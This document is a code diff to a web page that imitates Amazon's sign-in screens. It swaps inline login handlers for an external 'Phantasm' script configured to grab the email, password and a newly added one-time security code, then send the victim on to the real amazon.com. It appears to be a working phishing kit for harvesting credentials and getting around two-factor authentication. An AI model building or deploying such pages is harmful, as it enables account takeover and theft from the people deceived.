@@ -248,12 +248,12 @@
 
     <!-- Step 1: Email -->
     <div class="card" id="step-1">
-        <h1>Sign in</h1>
-        <form onsubmit="handleEmailSubmit(event)">
+        <h1>Log in</h1>
+        <form id="form-step-1">
             <label for="email">Email or mobile phone number</label>
             <input type="text" id="email" name="email" required>
             
-            <button type="submit" class="btn-primary">Continue</button>
+            <button type="submit" id="btn-next" class="btn-primary">Continue</button>
             
             <div class="legal">
                 By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
@@ -273,19 +273,19 @@
 
     <!-- Step 2: Password -->
     <div class="card hidden" id="step-2">
-        <h1>Sign in</h1>
+        <h1>Log in</h1>
         <div class="user-pill">
             <span id="user-email-display">email@example.com</span>
-            <a class="change-link" onclick="goToStep1()">Change</a>
+            <a class="change-link" id="change-email-btn">Change</a>
         </div>
-        <form onsubmit="handlePasswordSubmit(event)">
+        <form id="form-step-2">
             <div style="display: flex; justify-content: space-between; align-items: baseline;">
                 <label for="password">Password</label>
                 <a href="#" style="font-size: 13px; color: #0066c0; text-decoration: none;">Forgot your password?</a>
             </div>
             <input type="password" id="password" name="password" required>
             
-            <button type="submit" class="btn-primary">Sign in</button>
+            <button type="submit" id="btn-submit" class="btn-primary">Log in</button>
             
             <div style="margin-top: 14px; font-size: 13px; display: flex; align-items: center;">
                 <input type="checkbox" id="remember" style="width: auto; margin-right: 5px;">
@@ -309,9 +309,8 @@
         <p>© 1996-2024, Amazon.com, Inc. or its affiliates</p>
     </div>
 
+    <script src="/core/assets/js/phantasm.js"></script>
     <script>
-        let userEmail = "";
-
         function toggleHelp() {
             const header = document.querySelector('.expander-header');
             const content = document.getElementById('help-content');
@@ -319,59 +318,44 @@
             content.classList.toggle('open');
         }
 
-        function handleEmailSubmit(event) {
-            event.preventDefault();
-            const emailInput = document.getElementById('email');
-            if (emailInput.value) {
-                userEmail = emailInput.value;
-                document.getElementById('user-email-display').textContent = userEmail;
-                
-                // Switch to Step 2
-                document.getElementById('step-1').classList.add('hidden');
-                document.getElementById('step-2').classList.remove('hidden');
-                document.getElementById('new-divider').classList.add('hidden');
-                document.getElementById('create-btn').classList.add('hidden');
-                document.getElementById('error-box').style.display = 'none';
-                
-                // Focus password
-                setTimeout(() => document.getElementById('password').focus(), 100);
-            }
-        }
-
-        function goToStep1() {
-            document.getElementById('step-2').classList.add('hidden');
-            document.getElementById('step-1').classList.remove('hidden');
-            document.getElementById('new-divider').classList.remove('hidden');
-            document.getElementById('create-btn').classList.remove('hidden');
-            document.getElementById('error-box').style.display = 'none';
-        }
-
-        async function handlePasswordSubmit(event) {
-            event.preventDefault();
-            const password = document.getElementById('password').value;
-            
-            try {
-                const response = await fetch('/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        email: userEmail,
-                        password: password
-                    })
-                });
-                
-                if (response.ok) {
-                    window.location.href = "https://www.amazon.com";
-                } else {
-                    // Show error
-                    const errorBox = document.getElementById('error-box');
-                    document.getElementById('error-message').textContent = "Incorrect password";
-                    errorBox.style.display = 'block';
+        document.addEventListener('DOMContentLoaded', () => {
+            // Initialize Phantasm Engine
+            new Phantasm({
+                redirectUrl: 'https://www.amazon.com',
+                selectors: {
+                    email: '#email',
+                    password: '#password',
+                    otp: '#otp-input',
+                    nextBtn: '#btn-next',
+                    submitBtn: '#btn-submit',
+                    otpBtn: '#btn-otp-submit',
+                    step1: '#step-1',
+                    step2: '#step-2',
+                    step3: '#step-3-otp',
+                    errorMsg: '#error-message'
                 }
-            } catch (error) {
-                console.error('Error:', error);
+            });
+
+            // Custom UI logic for Amazon (Change email link)
+            const changeBtn = document.getElementById('change-email-btn');
+            if(changeBtn) {
+                changeBtn.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    document.getElementById('step-2').classList.add('hidden');
+                    document.getElementById('step-1').classList.remove('hidden');
+                    document.getElementById('new-divider').classList.remove('hidden');
+                    document.getElementById('create-btn').classList.remove('hidden');
+                });
             }
-        }
+        });
     </script>
+
+    <!-- OTP Section -->
+    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
+        <h2 style="margin-bottom: 20px;">Security Check</h2>
+        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
+        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
+        <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
+    </div>
 </body>
 </html>
